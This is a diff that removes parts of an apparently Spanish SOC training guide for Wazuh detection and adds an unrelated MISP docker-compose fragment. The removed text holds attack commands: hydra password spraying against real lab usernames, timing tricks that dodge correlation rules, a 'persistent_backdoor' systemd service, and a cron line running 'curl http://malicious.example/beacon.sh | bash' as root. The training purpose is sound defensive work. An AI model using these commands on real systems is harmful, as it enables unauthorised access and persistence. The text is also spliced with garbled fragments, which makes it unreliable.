@@ -1,615 +1,4 @@
-Guía definitiva — 20 casos × 3 variantes con investigación profunda
-Para: David — Prácticas SOC Wazuh
-Objetivo: practicar ejecución y investigación profunda en Discover mediante escenarios progresivos
-Tiempo estimado: 10-14 horas (día completo + parte del siguiente)
-Entorno:
-
-kaliAgent (10.104.2.12) en linux_base + preproduction
-WindowsAgent (10.104.2.121) en windows_base + preproduction
-Dashboard: https://10.104.2.11
-Herramientas Kali: hydra, nmap, nc, curl, wget, nslookup, dig
-Usuario alphacentauri con sudo completo
-Lenguaje: DQL (no Lucene)
-
-
-Cómo usar esta guía
-Cada caso tiene 3 variantes:
-
-Fácil (F) — ejecutas, ves la alerta, identificas la regla.
-Medio (M) — más ruido o evasión. Filtros más precisos.
-Difícil (D) — análisis como analista SOC real.
-
-Estructura de cada variante:
-
-Comandos a ejecutar.
-Alertas esperadas.
-Investigación paso a paso en Discover — método completo del analista.
-Ejercicios de panel de fields.
-Limpieza.
-
-Metodología de investigación (aplicable a todos los casos):
-Para cada variante, te guío por las 7 fases del análisis de incidente:
-
-Fase 1 — Detección. ¿Cómo lo viste? ¿Qué filtro te sacó la alerta inicial?
-Fase 2 — Observación inicial. ¿Qué ves en la tabla? ¿Qué columnas necesitas?
-Fase 3 — Análisis del JSON. Abrir una alerta, expandir, entender campo por campo.
-Fase 4 — Hipótesis. ¿Qué crees que pasó? Formular 2-3 hipótesis.
-Fase 5 — Pivoting. Filtros nuevos para validar o descartar cada hipótesis.
-Fumnas: timestamp, rule.id, data.srcuser, data.srcip.
-Orden ascendente. Mira los intervalos de tiempo entre alertas. Si ves alertas cada 10 segundos separadas → es deliberadamente lento.
-Fase 3 — Análisis del JSON
-Abre una alerta. En data.srcuser ves los nombres: alphacentauri, david, carlos, administrador, soporte.
-Red flag importante: alphacentauri es tu usuario, david es tu nombre, carlos es tu jefe. Un atacante genérico no probaría estos usuarios — probaría admin, root, user.
-Esto cambia la clasificación del ataque: es dirigido, no automatizado.
-Fase 4 — Hipótesis
-
-"Atacante que conoce el entorno (insider o reconocimiento previo)."
-"Prueba autorizada pero mal planificada."
-"Script automático con lista personalizada (más sofisticado)."
-
-Fase 5 — Pivoting
-¿Qué hizo esa IP antes del ataque? Quizás hubo reconocimiento:
-data.srcip: "10.104.2.12"
-Con time picker ampliado a Last 1 hour. Mira si hay actividad previa: DNS lookups, escaneos, conexiones. Si ves un nmap o dig previo, confirma la hipótesis 1.
-¿Alguno de los intentos tuvo éxito?
-agent.id: "002" AND rule.id: "5715" AND data.srcuser: ("alphacentauri" OR "david" OR "carlos")
-Si aparece → compromiso exitoso. Escalada inmediata.
-Fase 6 — Baseline
-Intentos contra usuarios reales del entorno no son normales sin contexto autorizado. Un admin que olvida su password no prueba los nombres de sus compañeros.
-Fase 7 — Decisión
-Actividad dirigida sospechosa. Requiere investigación inmediata.
-Informe:
-
-"Detectados 6 intentos de SSH fallidos desde 10.104.2.12 contra usuarios reales del entorno (alphacentauri, david, carlos, administrador, soporte). Patrón dirigido: el atacante conoce los nombres de usuario. Separación temporal (10s) indica evasión deliberada de correlaciones. Ningún intento tuvo éxito. Recomendaciones: 1) identificar origen del reconocimiento previo (cómo obtuvo los usuarios), 2) alertar a todos los usuarios mencionados de actividad sospechosa, 3) reforzar contraseñas, 4) considerar regla custom con timeframe ampliado para detectar este tipo de evasión."
-
-Panel de fields — ejercicios
-
-data.srcuser → ¿todos los usuarios son reales del entorno?
-timestamp → ¿intervalo regular de 10s?
-data.srcport → ¿misma IP pero puertos origen distintos? Eso es normal en SSH.
-
-Limpieza (todas variantes)
-bashrm -f /tmp/users.txt
-
-CASO 2 — Password spraying
-MITRE: T1110.003
-Donde se ve: kaliAgent
-Escenario
-Un password común probado contra muchos usuarios. Evita bloqueos.
-
-Variante F — spray básico
-Comandos
-bashfor user in admin user guest test demo; do
-  ssh $user@10.104.2.12 -o ConnectTimeout=3 -o StrictHostKeyChecking=no 2>&1 | head -2
-  sleep 2
-done
-Investigación paso a paso
-Fase 1 — Detección
-agent.id: "002" AND rule.id: "5710"
-Ves varias alertas de "non-existent user".
-Fase 2 — Observación
-Columnas: timestamp, data.srcuser.
-La clave es el patrón: ¿muchos usuarios con pocos intentos, o pocos usuarios con muchos intentos?
-Fase 3 — Análisis
-Abre una alerta. full_log te dice: Invalid user admin from 127.0.0.1. Nada especial individualmente.
-Fase 4 — Hipótesis
-
-"Password spraying."
-"Fuerza bruta clásica."
-"Usuario legítimo que no recuerda su nombre."
-
-Fase 5 — Pivoting — la técnica clave
-En el panel de fields, clic en data.srcuser. Mira la distribución:
-
-Si ves admin (1), user (1), guest (1), test (1), demo (1) → distribución plana = spraying.
-Si ves admin (15), resto (1) → concentrado = brute force.
-
-Esto es el truco para distinguir spraying de fuerza bruta.
-Clic en data.srcip:
-
-1 sola IP atacando = atacante único.
-Múltiples IPs mismas credenciales = spray distribuido (más sofisticado).
-
-Fase 6 — Baseline
-5 usuarios distintos fallando en 10 segundos = no natural. Humanos no fallan así.
-Fase 7 — Decisión
-Actividad sospechosa compatible con password spraying. En producción, escalaría.
-Informe:
-
-"Detectados 5 intentos SSH contra usuarios distintos (admin, user, guest, test, demo) desde 10.104.2.12 en 10 segundos. Patrón de password spraying: distribución plana (1 intento por usuario). Ningún éxito. Recomiendo: 1) revisar si alguno de estos usuarios existe en el sistema, 2) verificar origen del ataque."
-
-Panel de fields
-
-data.srcuser → ¿cuántos únicos?
-data.srcip → ¿una sola IP?
-Ratio alertas/usuarios únicos → si es ~1, es spray.
-
-
-Variante M — hydra con password común
-Comandos
-bashcat > /tmp/spray_users.txt << EOF
-admin
-administrator
-root
-user
-guest
-test
-oracle
-mysql
-postgres
-backup
-ftp
-mail
-www
-apache
-nginx
-jenkins
-EOF
-
-hydra -L /tmp/spray_users.txt -p "Winter2024!" -t 3 -w 3 ssh://10.104.2.12 -V 2>/dev/null | head -30
-Investigación paso a paso
-Fase 1 — Detección
-agent.id: "002" AND rule.groups: "authentication_failed"
-Muchos hits. 16 usuarios × varios intentos cada uno = 30-50 alertas.
-Fase 2 — Observación
-Columnas estándar + rule.level. Ordena ascendente.
-¿Dispara correlación 5712? Añade filtro:
-agent.id: "002" AND rule.id: "5712"
-Si el volumen es alto, debería. Si no → hay gap en la correlación para spraying.
-Fase 3 — Análisis del JSON
-Abre una alerta 5710 típica. full_log: Invalid user apache from 127.0.0.1. Patrón claro.
-Fase 4 — Hipótesis
-Solo una razonable: ataque automatizado tipo spray.
-Fase 5 — Pivoting
-¿Alguno de los usuarios probados existe realmente?
-agent.id: "002" AND rule.id NOT: "5710" AND rule.groups: "authentication_failed"
-Si todos son "invalid user" (5710), ninguno existe. Si hay mezcla con 5503 ("PAM user login failed"), algún usuario sí existe → atacante acertó un nombre.
-Verifica en máquina:
-bashcat /etc/passwd | grep -E "^(apache|mysql|postgres)"
-Si alguno aparece → atacante escaneó usuarios que existen.
-Fase 6 — Baseline
-16 usuarios distintos en 1 minuto = ataque claro.
-Fase 7 — Decisión
-Incidente. Spraying con diccionario estándar.
-Informe:
-
-"Spraying SSH detectado desde 10.104.2.12 contra 16 usuarios (diccionario estándar: admin, administrator, root, apache, mysql, postgres, etc.). Volumen: ~40 intentos en 1 minuto. Sin éxitos confirmados. Ningún usuario del diccionario existe en el sistema. Origen: IP interna (posible máquina comprometida usada como pivote). Escalar a IT para investigar por qué una IP interna hace spray SSH."
-
-Panel de fields
-
-data.srcuser → distribución plana confirmada
-Distinción visual spray vs brute en histograma temporal
-rule.id → ¿mezcla 5710/5503 o solo 5710?
-
-
-Variante D — spray con usuarios reales
-Comandos
-bashcat > /tmp/real_users.txt << EOF
-alphacentauri
-david.laencina
-david
-carlos
-soporte
-administrator
-EOF
-
-hydra -L /tmp/real_users.txt -p "Password123!" -t 2 -w 5 ssh://10.104.2.12 -V 2>/dev/null | head -20
-Investigación paso a paso
-Fase 1 — Detección
-agent.id: "002" AND rule.groups: "authentication_failed"
-Menos volumen que la M (6 usuarios), pero cada uno real.
-Fase 2 — Observación
-Columnas: timestamp, rule.id, data.srcuser, full_log.
-Mira rule.id:
-
-Si mayoría es 5710 (invalid user) → los usuarios probados no existen.
-Si mayoría es 5503 (PAM failed) → los usuarios sí existen pero password malo.
-
-Este es el matiz crítico.
-Fase 3 — Análisis
-Abre una alerta 5503. full_log: Failed password for alphacentauri from 127.0.0.1. Usuario real + password malo.
-Fase 4 — Hipótesis
-
-"Ataque dirigido con lista personalizada." — muy probable.
-"Error humano de alguien que conoce los usuarios." — posible pero raro probar 6 usuarios distintos.
-
-Fase 5 — Pivoting
-La pregunta más importante: ¿alguno tuvo éxito?
-agent.id: "002" AND rule.id: "5715"
-Con time picker abarcando el ataque. Si ves rule.id: 5715 con data.srcuser de la lista → compromiso exitoso → incidente crítico.
-Si no, el atacante falló esta vez, pero tiene los nombres correctos y lo intentará con otras passwords.
-Fase 6 — Baseline
-6 usuarios reales del entorno probados sistemáticamente en orden = jamás es normal. Siempre incidente.
-Fase 7 — Decisión
-Incidente dirigido. Escalada inmediata.
-Informe:
-
-*"Spray SSH dirigido detectado desde 10.104.2.12 contra 6 usuarios reales del entorno (alphacentauri, david.laencina, david, carlos, soporte, administrator). Password común probado: 'Password123!'. Ningún éxito. El atacante conoce los usuarios del entorno, lo que sugiere reconocimiento previo o acceso a información interna. Recomendaciones CRÍTICAS:
-
-Alertar inmediatamente a los usuarios mencionados para cambiar contraseñas.
-Activar MFA si está disponible.
-Investigar cómo el atacante obtuvo los usuarios (fuga de información, phishing previo, compromiso de directorio).
-Revisar logs de Active Directory / autenticación corporativa de las últimas 48h.
-Bloquear IP origen.
-Considerar incidente de seguridad formal."*
-
-
-Panel de fields
-
-data.srcuser → ¿todos son nombres reales?
-rule.id distribución: ¿cuántos 5710 (invalidos) vs 5503 (reales con pass mal)?
-Cruzar lista de usuarios probados con /etc/passwd.
-
-Limpieza
-bashrm -f /tmp/users.txt /tmp/spray_users.txt /tmp/real_users.txt
-
-CASO 3 — Sudo fallido
-MITRE: T1548.003
-Donde se ve: kaliAgent
-Escenario
-Atacante intenta escalar a root.
-
-Variante F — 3 fallos + éxito
-Comandos
-bashsudo -k
-sudo ls   # mal
-sudo ls   # mal
-sudo ls   # mal
-sudo ls   # correcta
-Alertas
-rule.iddescriptionnivel5557unix_chkpwd: Password check failed55503PAM: User login failed55404Three failed attempts to run sudo105402Successful sudo to ROOT executed3
-Investigación paso a paso
-Fase 1 — Detección
-El primer indicador que mirarás es la alerta correlacionada:
-agent.id: "002" AND rule.id: "5404"
-Nivel 10 = debería aparecer en "Alertas de Atención" del dashboard.
-Fase 2 — Observación inicial
-Ya sabes que ha habido algo. Ahora amplía al contexto completo:
-agent.id: "002" AND rule.groups: "pam"
-Columnas: timestamp, rule.id, rule.description, full_log.
-Orden ascendente — esto es lo importante, porque queremos reconstruir la secuencia temporal.
-Fase 3 — Análisis del JSON
-Abre la alerta 5404. Campos relevantes:
-
-rule.firedtimes
-full_log: ves algo tipo pam_unix(sudo:auth): authentication failure; logname= uid=1000 euid=0 tty=/dev/pts/X ruser=alphacentauri rhost=  user=alphacentauri
-data.uid — 1000 (usuario normal).
-data.euid — 0 (euid de sudo).
-
-Abre la alerta 5402 (la exitosa). Mismo usuario, mismo patrón, pero esta vez el log indica éxito.
-Fase 4 — Hipótesis
-
-"Atacante intentando escalar."
-"Administrador legítimo que olvidó brevemente la password."
-"Script automatizado con password incorrecta."
-
-Fase 5 — Pivoting
-¿Qué hizo el usuario antes del sudo?
-agent.id: "002" AND data.srcuser: "alphacentauri"
-Con time picker ampliado. Si ves actividad normal de trabajo (conexión SSH hace tiempo, varios comandos) → escenario 2 (admin olvidadizo) gana peso.
-Si ves login reciente + sudo inmediato + muchos fallos → escenario 1 (atacante) gana peso.
-¿Qué hizo después del sudo exitoso?
-agent.id: "002" AND data.srcuser: "alphacentauri" AND @timestamp
-Con time picker de 10 min tras el sudo exitoso. ¿Crea usuarios? ¿Modifica /etc/passwd? ¿Instala servicios?
-Fase 6 — Baseline
-En un entorno normal, los sudo fallidos son raros. 3 fallos seguidos es anómalo. La cuestión es la actividad posterior, no el fallo en sí.
-Fase 7 — Decisión
-Depende del contexto:
-
-Solo fallos + éxito sin actividad posterior anómala = FP probable (admin distraído).
-Fallos + éxito + actividad sospechosa después = incidente confirmado.
-
-Informe (si es FP):
-
-"Detectada regla 5404 (3 fallos sudo) desde usuario alphacentauri en kaliAgent. Seguida de sudo exitoso. Revisión de actividad posterior (10 min): comportamiento normal (ls, cd, etc.). Clasificación: falso positivo probable. Posible olvido de contraseña."
-
-Informe (si es incidente):
-
-"Patrón de escalada sospechosa detectado. Usuario alphacentauri: 3 fallos de sudo + éxito, seguidos de creación de usuario backdoor + modificación de /etc/sudoers.d. Compatible con fuerza bruta exitosa de contraseña sudo. Recomiendo: reseteo inmediato de contraseña, revisión de sesión, investigación."
-
-Panel de fields
-
-rule.id → secuencia 5557/5503/5404/5402 clara.
-data.srcuser → siempre el mismo.
-full_log → lee los PAM messages para entender el flujo.
-
-
-Variante M — muchos fallos
-Comandos
-bashsudo -k
-sudo ls   # fallos sucesivos (6-7 veces mete mal la contraseña)
-sudo ls   # al final la correcta
-Investigación paso a paso
-Fase 1 — Detección
-agent.id: "002" AND rule.id: "5404"
-Pregunta clave: ¿dispara varias veces (una por cada grupo de 3 fallos) o solo una vez en total?
-Fase 2 — Observación
-Si dispara varias veces, cuéntalo. Con 7 fallos deberías ver aprox 2 disparos de la 5404 (uno a los 3, otro a los 6).
-Fase 3 — Análisis
-Abre dos 5404 distintas y compara:
-
-rule.firedtimes — va incrementando.
-previous_output — lista los eventos que formaron cada disparo.
-Timestamps de los eventos previos — deberían ser distintos entre los dos disparos.
-
-Fase 4 — Hipótesis
-Si hay varios disparos: la correlación funciona para ataques sostenidos. Si solo hay uno: la correlación se dispara y luego "se cansa".
-Fase 5 — Pivoting
-Mira en documentación o ruleset los parámetros de la 5404:
-
-frequency="3" — 3 eventos.
-timeframe="120" — en 2 minutos.
-
-Con esto entiendes el comportamiento: cada 3 fallos en 2 minutos = 1 alerta.
-Fase 6 — Baseline
-7 fallos de sudo nunca es normal. Siempre investigar.
-Fase 7 — Decisión
-Informe con foco en el aprendizaje técnico:
-
-"Detectados 7 fallos de sudo desde alphacentauri en 1 minuto. La regla 5404 disparó 2 veces (en los fallos 3 y 6) siguiendo su configuración frequency=3/timeframe=120s. Éxito posterior registrado. Comportamiento compatible con error humano de contraseña (alta frecuencia, sin actividad sospechosa posterior). FP confirmado."
-
-Panel de fields
-
-Mira evolución de rule.firedtimes en la 5404.
-Compara diferencia temporal entre disparos de 5404.
-
-
-Variante D — fallos lentos
-Comandos
-bashsudo -k
-sudo ls   # mal
-sleep 60
-sudo ls   # mal
-sleep 60
-sudo ls   # mal
-sleep 60
-sudo ls   # correcta
-Investigación paso a paso
-Fase 1 — Detección
-agent.id: "002" AND rule.id: "5404"
-Resultado esperado: 0 hits. Aquí empieza lo interesante.
-Amplía el filtro:
-agent.id: "002" AND rule.groups: "pam"
-Ves los fallos individuales, pero no la correlación.
-Fase 2 — Observación
-Columnas estándar. Mira los intervalos de tiempo entre alertas — 60 segundos entre cada una.
-Fase 3 — Análisis
-Abre una alerta 5557 (password check failed). full_log normal. Nada indica ataque individualmente.
-Fase 4 — Hipótesis
-
-"Usuario legítimo pensando mucho entre intentos." — posible pero raro con un ratio tan estable (60s exactos).
-"Atacante evadiendo correlación deliberadamente." — el ratio estable es sospechoso.
-"Script automatizado con delay configurado." — compatible.
-
-Fase 5 — Pivoting
-La pregunta clave: ¿hay éxito al final?
-agent.id: "002" AND (rule.id: "5557" OR rule.id: "5402")
-Ordena ascendente. Si ves patrón 5557, 5557, 5557, 5402 → éxito tras fallos pero sin correlación disparada.
-Este es un gap de detección documentable.
-Fase 6 — Baseline
-Ratio de 60 segundos exactos entre fallos = no humano.
-Fase 7 — Decisión
-Hallazgo metodológico importante para la demo.
-Informe:
-
-*"Detectado patrón de fallos de sudo con delay deliberado (60s entre intentos) por usuario alphacentauri. La regla 5404 (correlación nativa) NO disparó debido a su timeframe corto (120s). Éxito final tras los fallos. Gap de detección identificado: ataques sostenidos con delay > timeframe evaden correlaciones estándar.
-Propuesta de mejora: añadir regla custom 100055 con timeframe extendido (600-1800s) para detectar estos patrones. Esta observación se presentará a Carlos como mejora propuesta."*
-
-Panel de fields
-
-timestamp en orden ascendente — medir intervalo medio.
-rule.id → solo 5557/5503, sin 5404.
-Baseline: ¿alguna vez has visto fallos de sudo separados 60s exactos legítimamente?
-
-Limpieza
-Nada.
-
-CASO 4 — Login exitoso tras fallos
-MITRE: T1078
-Donde se ve: kaliAgent
-Escenario
-Muchos fallos + éxito = posible fuerza bruta exitosa.
-
-Variante F — 2 fallos + éxito
-Comandos
-bashssh alphacentauri@10.104.2.12
-# mal, Ctrl+C
-ssh alphacentauri@10.104.2.12
-# mal, Ctrl+C
-ssh alphacentauri@10.104.2.12
-# correcta
-exit
-Investigación paso a paso
-Fase 1 — Detección
-agent.id: "002" AND decoder.name: "sshd"
-Filtras todo lo de SSH.
-Fase 2 — Observación
-Columnas: timestamp, rule.id, rule.description, data.srcuser.
-Ordena ascendente. Busca el patrón visualmente: 5503 (failed) → 5503 (failed) → 5715 (success).
-Fase 3 — Análisis
-Abre el 5715 (successful):
-
-data.srcuser: alphacentauri.
-full_log: Accepted password for alphacentauri from X port X ssh2.
-
-Abre los 5503 previos. Mismo usuario, misma IP.
-Fase 4 — Hipótesis
-
-"Usuario se equivocó 2 veces al escribir password."
-"Fuerza bruta exitosa."
-"Atacante probó credenciales robadas."
-
-Con solo 2 fallos, la hipótesis 1 es la más probable (humanos se equivocan 1-2 veces normalmente).
-Fase 5 — Pivoting
-¿Qué hizo tras entrar?
-agent.id: "002" AND data.srcuser: "alphacentauri"
-Time picker: desde 1 min antes del 5715 hasta 10 min después. Si ves actividad normal (ls, cd, etc.) = usuario legítimo. Si ves creación de usuarios, modificación de sshd_config = sospechoso.
-Fase 6 — Baseline
-2 fallos + éxito es el rango normal de errores humanos. No es inmediatamente sospechoso.
-Fase 7 — Decisión
-FP probable.
-Informe:
-
-"Usuario alphacentauri: 2 fallos SSH seguidos de éxito. Patrón consistente con error humano de contraseña. Actividad posterior normal. Clasificación: FP."
-
-Panel de fields
-
-rule.id → ¿3 eventos en orden esperado?
-data.srcuser → mismo usuario en todos.
-data.srcip → misma IP.
-
-
-Variante M — 5 fallos + éxito
-Comandos
-Repite 5 veces con password mal, luego correcto.
-Investigación paso a paso
-Fase 1 — Detección
-agent.id: "002" AND data.srcuser: "alphacentauri" AND rule.level >= 10
-Este es el filtro crítico. Si tu SOC tuviera regla de correlación para "muchos fallos + éxito", dispararía aquí. Si no → gap confirmado.
-Amplía:
-agent.id: "002" AND decoder.name: "sshd"
-Ves fallos + éxito pero sin correlación.
-Fase 2 — Observación
-Cuenta manualmente los 5503 (fallos) y verifica que haya 5715 (éxito) después.
-Fase 3 — Análisis
-Igual que F pero con más fallos. 5 fallos = improbable que sea error humano.
-Fase 4 — Hipótesis
-
-"Atacante adivinó password." — mucho más probable con 5 fallos.
-"Usuario olvidó completamente password y lo recordó." — posible.
-"Herramienta automática que probó passwords." — muy probable si los fallos fueron rápidos.
-
-Fase 5 — Pivoting
-Intervalos entre fallos:
-Si son <5 segundos = automatizado. Si son >30 segundos = manual (usuario pensando).
-Actividad posterior:
-agent.id: "002" AND @timestamp
-Time picker: 30 min tras el 5715. Mira todo lo que pasó. Cualquier cosa anómala = incidente probable.
-Fase 6 — Baseline
-5 fallos seguidos no es normal. Siempre investigar.
-Fase 7 — Decisión
-Requiere investigación. El caso es lo suficientemente grave como para contactar al usuario y preguntar si ha tenido problemas.
-Informe:
-
-*"Detectados 5 fallos SSH + éxito para usuario alphacentauri en 30 segundos. Patrón inusual:
-
-Intervalos cortos sugieren automatización.
-5 fallos excede error humano típico.
-
-La regla 5404 no aplica (es para sudo). La regla 5712 no disparó (sería brute force de múltiples usuarios). Gap detectado: no hay correlación para 'fallos múltiples + éxito mismo usuario' (posible fuerza bruta exitosa).
-Propuesta de mejora: regla custom 100055 con lógica:
-
-Al menos 3 fallos SSH (5503) del mismo usuario desde la misma IP.
-Seguidos de 1 éxito (5715) del mismo usuario desde la misma IP.
-Timeframe: 300-600 segundos.
-Nivel: 13 (crítico).
-
-Recomendación inmediata: contactar al usuario para verificar si tuvo problemas con su contraseña."*
-
-Panel de fields
-
-Distribución temporal de fallos.
-data.srcuser → mismo en fallos y éxito.
-data.srcport → puertos distintos pero misma IP.
-
-
-Variante D — éxito disfrazado
-Comandos
-bashfor i in 1 2 3; do
-  ssh alphacentauri@10.104.2.12 -o ConnectTimeout=3 << EOF
-badpass
-EOF
-done
-
-sleep 300
-
-ssh alphacentauri@10.104.2.12 -o ConnectTimeout=3
-# correcta
-exit
-Investigación paso a paso
-Fase 1 — Detección
-agent.id: "002" AND decoder.name: "sshd"
-Pero con time picker en Last 30 minutes para ver los fallos antiguos + el éxito reciente.
-Fase 2 — Observación
-Orden ascendente. Ves:
-
-Fallos: tiempo T.
-Éxito: tiempo T+5min.
-
-5 minutos de gap = ninguna correlación típica lo conecta.
-Fase 3 — Análisis
-Individualmente:
-
-Los 3 fallos parecen "intento fallido normal".
-El éxito parece "login normal".
-
-Ninguno, por sí solo, es sospechoso.
-Fase 4 — Hipótesis
-
-"Dos eventos independientes sin relación."
-"Atacante con paciencia que separa fallos y éxito para evadir detección."
-
-Sin más contexto, la 1 gana. Pero la 2 es plausible si hay evidencia adicional.
-Fase 5 — Pivoting
-Intenta correlacionar manualmente:
-agent.id: "002" AND data.srcuser: "alphacentauri" AND data.srcip: "10.104.2.12"
-Con time picker amplio (1 hora). Ordena ascendente. Ves tú el patrón: fallos, pausa, éxito.
-Este es un ejercicio de threat hunting — no hay alerta directa, solo tu capacidad de correlacionar manualmente con filtros.
-Fase 6 — Baseline
-¿Alphacentauri suele fallar SSH? Si su baseline es "nunca falla", 3 fallos + éxito días después siguen siendo sospechosos incluso con gap temporal.
-Fase 7 — Decisión
-Gap de detección profundo.
-Informe:
-
-*"Caso de evasión temporal detectado manualmente mediante threat hunting:
-
-Tiempo T: 3 fallos SSH alphacentauri desde 10.104.2.12.
-Tiempo T+5min: éxito SSH alphacentauri desde 10.104.2.12.
-
-Ninguna correlación nativa ni custom alertó sobre este patrón. Solo análisis manual lo conecta.
-Este caso ilustra una limitación fundamental: ataques con evasión temporal > 5 min son invisibles a correlaciones automatizadas típicas. Detección requiere:
-
-Búsquedas retroactivas programadas cada hora buscando patrones de este tipo.
-Reglas con timeframe de 3600s (1h).
-Integración con herramientas de UEBA (User Entity Behavior Analytics).
-
-Este hallazgo ilustra el valor del threat hunting manual complementario a las alertas automatizadas."*
-
-Panel de fields
-
-timestamp → medir intervalos completos del ataque.
-Ejercicio: construye tú la timeline manualmente.
-
-Limpieza
-Nada.
-
-CASO 5 — Creación de usuario
-MITRE: T1136.001
-Donde se ve: kaliAgent
-
-Variante F — usuario básico
-Comandos
-bashsudo useradd -m -s /bin/bash usuario_test
-sudo passwd usuario_test
-# Test1234
-Alertas
-rule.iddescriptionnivel5902New group added85904New user added8
-Investigación paso a paso
-Fase 1 — Detección
-agent.id: "002" AND rule.id: ("5902" OR "5904")
-Fase 2 — Observación
-Columnas: timestamp, rule.id, rule.description, data.dstuser, full_log.
-Ordena ascendente. Ves 5902 (grupo) y 5904 (usuario) en segundos de diferencia.
-Fase 3 — Análisis
-Abre 5904:
-
-data.dstuser: usuario_test.
-full_log: new user: name=usuario_test, UID=XXXX, GID=XXXX, home=/home/usuario_test, shell=/bin/bash.
-
-De aquí sacas: nombre, UID, GID, home, shell. Toda la info del usuario creado.
-Fase 4 — Hipótesis
-
-"Administrador legítimo creando usuario para un nuevo empleado/servicio."
+Guía ; Fase 5
 "Atacante creando backdoor."
 
 Fase 5 — Pivoting
@@ -1305,106 +694,6 @@ Fase 7 — Decisión
 Incidente confirmado.
 Informe:
 
-*"Cron malicioso 'system_check' detectado en /etc/cron.d de kaliAgent. Análisis de contenido:
-Primera entrada (disfraz): tarea legítima de limpieza de logs.
-Segunda entrada (payload real): 'curl http://malicious.example/beacon.sh | bash' ejecutado como root cada 5 min.
-Técnica: disfraz con contenido aparentemente legítimo para evadir revisión superficial.
-Limitación del SOC: FIM detectó la creación del fichero pero no pudo alertar sobre el contenido malicioso. El análisis requirió inspección manual.
-Mejora propuesta: activar report_changes=yes en FIM para /etc/cron.d/. Esto guardaría el diff del contenido y permitiría filtros como full_log: *curl* AND full_log: *bash*.
-Acciones:
-
-Eliminar cron.
-Verificar si el payload se ejecutó (logs de curl, resoluciones DNS hacia malicious.example).
-Buscar indicadores adicionales de compromiso.
-Rotar credenciales si hay sospecha de compromiso previo."*
-
-
-Panel de fields
-Análisis manual en máquina es lo esencial.
-Limpieza
-bashsudo rm /etc/cron.d/system_check
-
-CASO 9 — Servicio systemd
-MITRE: T1543.002
-Donde se ve: kaliAgent
-
-Variante F — servicio simple
-Comandos
-bashsudo tee /etc/systemd/system/soc_test.service > /dev/null << 'EOF'
-[Unit]
-Description=SOC Test Service
-
-[Service]
-ExecStart=/bin/sleep 60
-Type=simple
-
-[Install]
-WantedBy=multi-user.target
-EOF
-
-sudo systemctl daemon-reload
-Investigación paso a paso
-Fase 1 — Detección
-agent.id: "002" AND syscheck.path: "/etc/systemd/system/*"
-Fase 2 — Observación
-
-Path: /etc/systemd/system/soc_test.service.
-Event: added.
-
-Fase 3 — Análisis
-En máquina:
-bashcat /etc/systemd/system/soc_test.service
-systemctl status soc_test  # (no arrancará porque no lo enable)
-Revisa ExecStart. ¿Qué ejecuta? /bin/sleep 60 — inofensivo.
-Fase 4 — Hipótesis
-
-"Servicio legítimo (pruebas, configuración)."
-"Atacante preparando persistencia (pero aún no activado)."
-
-Fase 5 — Pivoting
-¿Está activado (enabled)?
-bashsystemctl is-enabled soc_test
-Si no → ataque parcial.
-¿Está corriendo?
-bashsystemctl is-active soc_test
-Si no → inactivo.
-Un servicio creado pero no enabled ni started = setup incompleto. Sospechoso pero no peligroso aún.
-Fase 6 — Baseline
-Servicios nuevos en /etc/systemd/system/ deben tener justificación.
-Fase 7 — Decisión
-Sospechoso. Investigar si fue creación autorizada.
-Informe:
-
-"Servicio systemd 'soc_test' creado en kaliAgent. ExecStart=/bin/sleep 60. No enabled ni active. Posible setup en progreso o prueba técnica. Recomendar verificar justificación y eliminar si no autorizado."
-
-Panel de fields
-
-syscheck.path → todos los .service modificados.
-
-Limpieza
-bashsudo rm /etc/systemd/system/soc_test.service
-sudo systemctl daemon-reload
-
-Variante M — servicio + activación
-Comandos
-bashsudo tee /etc/systemd/system/persistent_backdoor.service > /dev/null << 'EOF'
-[Unit]
-Description=Persistent Backdoor
-
-[Service]
-ExecStart=/bin/bash -c 'while true; do sleep 300; done'
-Restart=always
-Type=simple
-
-[Install]
-WantedBy=multi-user.target
-EOF
-
-sudo systemctl daemon-reload
-sudo systemctl enable persistent_backdoor
-sudo systemctl start persistent_backdoor
-Investigación paso a paso
-Fase 1 — Detección
 agent.id: "002" AND syscheck.path: *.service AND syscheck.event: "added"
 Y también:
 agent.id: "002" AND syscheck.path: */multi-user.target.wants/*
@@ -2849,6 +2138,136 @@ services:
       - "REDIS_PORT=${REDIS_PORT:-6379}"
       - "REDIS_PASSWORD=${REDIS_PASSWORD:-redispassword}"
       - "ENABLE_REDIS_EMPTY_PASSWORD=${ENABLE_REDIS_EMPTY_PASSWORD:-false}"
+      - "SMTP
+
+
+services:
+  mail:
+    image: ghcr.io/egos-tech/smtp:1.1.3
+    restart: always
+    environment:
+      - "SMARTHOST_ADDRESS=${SMARTHOST_ADDRESS}"
+      - "SMARTHOST_PORT=${SMARTHOST_PORT}"
+      - "SMARTHOST_USER=${SMARTHOST_USER}"
+      - "SMARTHOST_PASSWORD=${SMARTHOST_PASSWORD}"
+      - "SMARTHOST_ALIASES=${SMARTHOST_ALIASES}"
+      - "TZ=${TZ:-UTC}"
+
+  redis:
+    image: valkey/valkey:7.2
+    restart: always
+    command: |
+      sh -c '
+      if [ "$${ENABLE_REDIS_EMPTY_PASSWORD:-false}" = "true" ]; then
+        exec valkey-server
+      else
+        exec valkey-server --requirepass "$${REDIS_PASSWORD:-redispassword}"
+      fi
+      '
+    environment:
+      - "ENABLE_REDIS_EMPTY_PASSWORD=${ENABLE_REDIS_EMPTY_PASSWORD:-false}"
+      - "REDIS_PASSWORD=${REDIS_PASSWORD:-redispassword}"
+      - "TZ=${TZ:-UTC}"
+    healthcheck:
+      test: |
+        sh -c '
+        if [ "$${ENABLE_REDIS_EMPTY_PASSWORD:-false}" = "true" ]; then
+          valkey-cli -p $${REDIS_PORT:-6379} ping | grep -q PONG || exit 1
+        else
+          valkey-cli -a "$${REDIS_PASSWORD:-redispassword}" -p $${REDIS_PORT:-6379} ping | grep -q PONG || exit 1
+        fi
+        '
+      interval: 2s
+      timeout: 1s
+      retries: 3
+      start_period: 30s
+      start_interval: 5s
+    volumes:
+      - cache_data:/data
+
+  db:
+    image: mariadb:10.11
+    restart: always
+    environment:
+      - "MYSQL_USER=${MYSQL_USER:-misp}"
+      - "MYSQL_PASSWORD=${MYSQL_PASSWORD:-example}"
+      - "MYSQL_ROOT_PASSWORD=${MYSQL_ROOT_PASSWORD:-password}"
+      - "MYSQL_DATABASE=${MYSQL_DATABASE:-misp}"
+      - "TZ=${TZ:-UTC}"
+    command: "--innodb-buffer-pool-size=512M --innodb-change-buffering=none --innodb-io-capacity=1000 --innodb-io-capacity-max=2000 --innodb-log-file-size=600M --innodb-read-io-threads=16 --innodb-stats-persistent=ON --innodb-write-io-threads=4"
+    volumes:
